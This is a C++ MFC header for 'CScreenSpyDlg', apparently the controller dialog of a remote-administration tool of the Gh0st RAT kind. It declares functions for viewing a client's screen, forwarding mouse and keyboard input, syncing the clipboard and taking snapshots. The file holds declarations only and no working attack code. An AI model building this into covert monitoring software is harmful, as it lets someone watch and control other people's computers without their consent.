#pragma once
#include "IOCPServer.h"

// CScreenSpyDlg 对话框

class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer=NULL, CONTEXT_OBJECT *ContextObject=NULL);   
	virtual ~CScreenSpyDlg();

	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer*     m_iocpServer;

	VOID CScreenSpyDlg::SendNext(void);
	VOID CScreenSpyDlg::OnReceiveComplete();
	HDC  m_hFullDC;        
	HDC  m_hFullMemDC;
	HBITMAP	m_BitmapHandle;
	PVOID   m_BitmapData_Full;
	LPBITMAPINFO m_BitmapInfor_Full;
	VOID CScreenSpyDlg::DrawFirstScreen(void);
	VOID CScreenSpyDlg::DrawNextScreenDiff(void);
	BOOL         m_bIsFirst;
	ULONG m_ulHScrollPos;
	ULONG m_ulVScrollPos;
	VOID CScreenSpyDlg::DrawTipString(CString strString);

	HICON  m_hIcon;
	HICON  m_hCursor;
	POINT  m_ClientCursorPos;
	BYTE m_bCursorIndex;
	CString  m_strClientIP;
	BOOL     m_bIsTraceCursor;
	VOID CScreenSpyDlg::SendCommand(MSG* Msg);

	VOID CScreenSpyDlg::UpdateServerClipboard(char *szBuffer,ULONG ulLength);
	VOID CScreenSpyDlg::SendServerClipboard(void);

	BOOL  m_bIsCtrl;
	LPBYTE m_szData;
	BOOL  m_bSend;
	ULONG m_ulMsgCount;

	BOOL CScreenSpyDlg::SaveSnapshot(void);
	// 对话框数据
	enum { IDD = IDD_DIALOG_SCREEN_SPY };

	BOOL m_bFullScreen;

	WINDOWPLACEMENT m_struOldWndpl;

	void EnterFullScreen();
	void LeaveFullScreen();

	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnLButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	afx_msg BOOL OnMouseWheel(UINT nFlags, short zDelta, CPoint pt);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnKillFocus(CWnd* pNewWnd);
	afx_msg void OnSize(UINT nType, int cx, int cy);

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
};
